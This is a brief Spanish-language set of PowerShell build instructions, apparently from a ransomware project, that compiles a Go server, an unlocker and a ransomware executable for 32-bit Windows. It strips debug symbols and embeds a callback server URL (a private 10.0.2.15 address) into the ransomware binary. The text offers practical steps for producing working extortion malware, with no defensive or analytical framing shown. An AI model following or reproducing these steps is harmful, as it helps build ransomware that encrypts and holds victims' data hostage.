Descargar versión estable más reciente de go.

# compilar el server
cd build\server; $env:GOOS=""; $env:GOARCH=""; go build -ldflags "-s -w" -o D:\Descargas\ransomware\ransomware\bin\server\server.exe; cd ..\..

# compilar el unlocker
cd build\unlocker; $env:GOOS="windows"; $env:GOARCH="386"; go build -ldflags "-s -w" -o D:\Descargas\ransomware\ransomware\bin\unlocker.exe; cd ..\..

# compilar el ransomware
cd D:\Descargas\ransomware\ransomware\build\ransomware
$env:GOOS="windows"; $env:GOARCH="386"
go build -ldflags "-s -w -X main.ServerBaseURL=http://10.0.2.15:8080" -o D:\Descargas\ransomware\ransomware\bin\ransomware.exe
cd ..\..
